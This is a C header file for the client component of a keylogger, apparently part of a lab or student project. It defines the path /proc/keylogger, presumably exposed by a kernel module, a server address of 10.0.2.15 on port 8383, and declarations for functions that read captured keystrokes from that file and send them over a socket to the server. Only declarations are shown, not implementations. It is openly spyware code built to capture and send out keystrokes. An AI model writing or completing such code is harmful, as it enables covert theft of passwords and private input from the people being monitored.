#ifndef CLIENT_H
#define CLIENT_H

#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdbool.h>

/**
 * @file client.h
 * @brief Header file for client-side socket and keylogger interactions.
 */

/** 
 * @brief Path to the proc file for keylogger data.
 */
#define PROCFS_PATH "/proc/keylogger"

/** 
 * @brief IP address of the server to connect to.
 */
#define SERVER_IP "10.0.2.15"

/** 
 * @brief Port number on the server to connect to.
 */
#define SERVER_PORT 8383

/** 
 * @brief Microseconds to sleep for 1 millisecond.
 */
#define ONE_MSEC 1000

/** 
 * @brief Buffer size for reading data.
 */
#define BUFF_SIZE 2

/** 
 * @brief Sleep duration in seconds while waiting for proc file.
 */
#define SEC 1

/**
 * @brief Create a socket for communication.
 * 
 * @return int The file descriptor of the created socket.
 */
int create_socket();

/**
 * @brief Connect to the server.
 * 
 * @param sock The file descriptor of the socket.
 * @param server_addr Pointer to the server address structure.
 */
void connect_to_server(int sock, struct sockaddr_in *server_addr);

/**
 * @brief Wait for the /proc/keylogger file to be created.
 */
void wait_for_procfs();

/**
 * @brief Open the /proc/keylogger file.
 * 
 * @return int The file descriptor of the opened file.
 */
int open_procfs();

/**
 * @brief Read data from /proc/keylogger and send it to the server.
 * 
 * @param fd The file descriptor of the /proc/keylogger file.
 * @param sock The file descriptor of the socket connected to the server.
 */
void read_and_send_data(int fd, int sock);

#endif // CLIENT_H
